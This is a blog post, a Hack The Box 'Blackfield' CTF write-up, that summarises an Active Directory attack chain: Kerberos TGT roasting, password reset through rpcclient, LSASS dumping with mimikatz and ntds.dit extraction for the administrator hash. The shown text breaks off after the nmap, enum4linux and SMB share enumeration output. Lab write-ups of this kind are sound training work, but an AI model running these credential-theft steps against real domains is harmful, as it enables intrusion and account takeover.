<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." /><meta property="og:title" content="Hackthebox Blackfield writeup" /><meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/blackfield/blackfield.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Blackfield writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/blackfield/blackfield.png"><title>Hackthebox Blackfield writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Blackfield writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Blackfield writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 9, 2020, 12:00 AM +0800" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/blackfield/blackfield.png" class="post-preview-img"><h1 id="introductionblackfield">Introduction@Blackfield:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Blackfield<tr><td>IP<td>10.10.10.192<tr><td>Points<td>40<tr><td>Os<td>Linux<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/6259" target="_blank">aas</a><tr><td>Out On<td>06 June 2020</table></div><h1 id="briefblackfield">Brief@Blackfield:~$</h1><p><code class="language-plaintext highlighter-rouge">Well</code> the journey starts from a <strong>smb</strong> share which has a lot of <code class="language-plaintext highlighter-rouge">dirs</code> that turned out to be <strong>usernames</strong> . Generating <code class="language-plaintext highlighter-rouge">TGT</code> for a valid user and <code class="language-plaintext highlighter-rouge">cracking</code> it with <strong>john</strong>.Now i can login to <code class="language-plaintext highlighter-rouge">rpcclient</code> the user has <strong>permissions</strong> to chnage another usersâ€™s <code class="language-plaintext highlighter-rouge">password</code> , Thats what we need ,Chnaged the pass and Got access to another <strong>share</strong> which contain a <code class="language-plaintext highlighter-rouge">.zip</code> file , <strong>Unzipping</strong> it we have a <strong>Memory</strong> <code class="language-plaintext highlighter-rouge">Dump</code> <strong>file</strong> . Dumping it with <code class="language-plaintext highlighter-rouge">mimikatz</code> gave us <strong>NTLM</strong> <code class="language-plaintext highlighter-rouge">hash</code> of a user.Logged in using <strong><code class="language-plaintext highlighter-rouge">Evil-Winrm</code></strong> . The user can <code class="language-plaintext highlighter-rouge">backup</code> the files since it has <strong>rights</strong> to do it . <code class="language-plaintext highlighter-rouge">Backup</code> the <strong>ntds.dit</strong> and getting the <code class="language-plaintext highlighter-rouge">SYSTEM</code> file , <strong>Dumping</strong> the <code class="language-plaintext highlighter-rouge">NTLM</code> hash from the files using <code class="language-plaintext highlighter-rouge">secretdump</code> , Got ntlm hash of <code class="language-plaintext highlighter-rouge">administrator</code>.</p><h1 id="summary">Summary</h1><ul><li><code class="language-plaintext highlighter-rouge">Anonymous</code> login to the share <strong>profiles$</strong><li>Creating a text file with the <strong>dirnames</strong><li><strong>Generating</strong> a <code class="language-plaintext highlighter-rouge">TGT</code> for a valid user saving it in a file<li>Cracking the hash with <strong>John</strong><li>Login to the <code class="language-plaintext highlighter-rouge">rpcclient</code><li>Changing the <strong>audit2020</strong> password to want i want.<li><code class="language-plaintext highlighter-rouge">Enumerating</code> the share <strong>forensic</strong><li>Got a zip file <code class="language-plaintext highlighter-rouge">lsass.zip</code> , Unzipping it<li>Got a <strong>memory Dump file</strong> <code class="language-plaintext highlighter-rouge">lsass.DMP</code><li>DUmping <strong>NTLM</strong> hash from the file using <strong>mimikatz</strong><li>Login as <code class="language-plaintext highlighter-rouge">svc_backup</code><li>Got <strong>User.txt</strong><li>the user <code class="language-plaintext highlighter-rouge">svc_backup</code> can backup the files<li>using <strong>diskshadow</strong> to create a new volume with <strong>alias</strong> of <code class="language-plaintext highlighter-rouge">c:</code><li><code class="language-plaintext highlighter-rouge">Copying</code> the <strong>ntds.dit</strong><li>Saving the <strong>registry</strong> file <code class="language-plaintext highlighter-rouge">SYSTEM</code><li>Cracking the <code class="language-plaintext highlighter-rouge">NTLM</code> hash from the files using <strong>secretdump.py</strong><li>Login as <code class="language-plaintext highlighter-rouge">administartor</code><li>Got <strong>root.txt</strong></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/blackfield.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
</pre><td class="rouge-code"><pre>âžœ  blackfield nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-v</span> blackfield.htb <span class="nt">-oA</span> scans/nmap.full
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-06-10 11:42 EDT
NSE: Loaded 151 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:42
Completed NSE at 11:42, 0.00s elapsed
Initiating NSE at 11:42
Completed NSE at 11:42, 0.00s elapsed
Initiating NSE at 11:42
Completed NSE at 11:42, 0.00s elapsed
Initiating Ping Scan at 11:42
Scanning blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span> <span class="o">[</span>4 ports]
Completed Ping Scan at 11:42, 0.49s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 11:42
Scanning blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span> <span class="o">[</span>65535 ports]
Discovered open port 135/tcp on 10.10.10.192
Discovered open port 53/tcp on 10.10.10.192
Discovered open port 445/tcp on 10.10.10.192
SYN Stealth Scan Timing: About 2.74% <span class="k">done</span><span class="p">;</span> ETC: 12:01 <span class="o">(</span>0:18:21 remaining<span class="o">)</span>
Discovered open port 593/tcp on 10.10.10.192
SYN Stealth Scan Timing: About 10.00% <span class="k">done</span><span class="p">;</span> ETC: 11:52 <span class="o">(</span>0:09:09 remaining<span class="o">)</span>
Discovered open port 88/tcp on 10.10.10.192
Discovered open port 5985/tcp on 10.10.10.192
SYN Stealth Scan Timing: About 21.31% <span class="k">done</span><span class="p">;</span> ETC: 11:49 <span class="o">(</span>0:05:36 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 30.48% <span class="k">done</span><span class="p">;</span> ETC: 11:48 <span class="o">(</span>0:04:36 remaining<span class="o">)</span>
Discovered open port 3268/tcp on 10.10.10.192
SYN Stealth Scan Timing: About 42.60% <span class="k">done</span><span class="p">;</span> ETC: 11:48 <span class="o">(</span>0:03:23 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 55.71% <span class="k">done</span><span class="p">;</span> ETC: 11:47 <span class="o">(</span>0:02:24 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 66.20% <span class="k">done</span><span class="p">;</span> ETC: 11:47 <span class="o">(</span>0:01:48 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 73.48% <span class="k">done</span><span class="p">;</span> ETC: 11:47 <span class="o">(</span>0:01:27 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 82.05% <span class="k">done</span><span class="p">;</span> ETC: 11:47 <span class="o">(</span>0:00:59 remaining<span class="o">)</span>
Discovered open port 389/tcp on 10.10.10.192
Completed SYN Stealth Scan at 11:47, 337.33s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Initiating Service scan at 11:47
Scanning 8 services on blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span>
Completed Service scan at 11:50, 154.55s elapsed <span class="o">(</span>8 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.10.192.
Initiating NSE at 11:50
Completed NSE at 11:51, 41.44s elapsed
Initiating NSE at 11:51
Completed NSE at 11:51, 1.51s elapsed
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
Nmap scan report <span class="k">for </span>blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span>
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    <span class="nb">bind
</span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-06-10 19:53:07Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/10%Time<span class="o">=</span>5EE100AE%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\</span><span class="s2">
SF:x04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h05m28s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2020-06-10T19:55:52
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>535.93 seconds
           Raw packets sent: 131274 <span class="o">(</span>5.776MB<span class="o">)</span> | Rcvd: 217 <span class="o">(</span>9.532KB<span class="o">)</span>
</pre></table></code></div></div><p>Ohâ€¦.the machine is about <code class="language-plaintext highlighter-rouge">active-directory</code> the ports that are opened are saying that â€¦.</p><h2 id="enum4lnux">enum4lnux</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>âžœ  prashant enum4linux blackfield.htb
Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Wed Jun 10 12:09:52 2020

 <span class="o">==========================</span> 
|    Target Information    |
 <span class="o">==========================</span> 
Target ........... blackfield.htb
RID Range ........ 500-550,1000-1050
Username ......... <span class="s1">''</span>
Password ......... <span class="s1">''</span>
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="o">======================================================</span> 
|    Enumerating Workgroup/Domain on blackfield.htb    |
 <span class="o">======================================================</span> 
<span class="o">[</span>E] Cant find workgroup/domain


 <span class="o">==============================================</span> 
|    Nbtstat Information <span class="k">for </span>blackfield.htb    |
 <span class="o">==============================================</span> 
Looking up status of 10.10.10.192
No reply from 10.10.10.192

 <span class="o">=======================================</span> 
|    Session Check on blackfield.htb    |
 <span class="o">=======================================</span> 
Use of uninitialized value <span class="nv">$global_workgroup</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at ./enum4linux.pl line 437.
<span class="o">[</span>+] Server blackfield.htb allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>
Use of uninitialized value <span class="nv">$global_workgroup</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at ./enum4linux.pl line 451.
<span class="o">[</span>+] Got domain/workgroup name: 

 <span class="o">=============================================</span> 
|    Getting domain SID <span class="k">for </span>blackfield.htb    |
 <span class="o">=============================================</span> 
Use of uninitialized value <span class="nv">$global_workgroup</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at ./enum4linux.pl line 359.
Domain Name: BLACKFIELD
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
<span class="o">[</span>+] Host is part of a domain <span class="o">(</span>not a workgroup<span class="o">)</span>
</pre></table></code></div></div><p>Got the domain name <code class="language-plaintext highlighter-rouge">BLACKFIELD</code> from the <strong>enum4linux</strong></p><h2 id="smbclient">Smbclient</h2><p>tried to login <code class="language-plaintext highlighter-rouge">anonymously</code> , I enumerated for available shares and here is what i got.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>âžœ  prashant smbclient <span class="nt">-L</span> blackfield.htb                                    
Enter WORKGROUP<span class="se">\r</span>oots password: 

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
        C<span class="nv">$ </span>             Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC<span class="nv">$ </span>           IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles<span class="nv">$ </span>      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled <span class="nt">--</span> no workgroup available
</pre></table></code></div></div><p>Okayâ€¦so basically we have almost 2 <strong>shares</strong></p><ul><li><code class="language-plaintext highlighter-rouge">forensic</code><li><code class="language-plaintext highlighter-rouge">profiles$</code></ul><p>I tried to login myself to the share <code class="language-plaintext highlighter-rouge">forensic</code></p><blockquote><p>forensic share</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>âžœ  prashant smbclient  //blackfield.htb/forensic             
Enter WORKGROUP<span class="se">\r</span>oots password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls
</span>NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
smb: <span class="se">\&gt;</span>
</pre></table></code></div></div><p>But we are not allowed to <code class="language-plaintext highlighter-rouge">enumerate</code> this share â€¦move on</p><blockquote><p>profiles$</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
</pre><td class="rouge-code"><pre>âžœ  prashant smbclient  //blackfield.htb/profiles<span class="err">$</span>
Enter WORKGROUP<span class="se">\r</span>oots password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
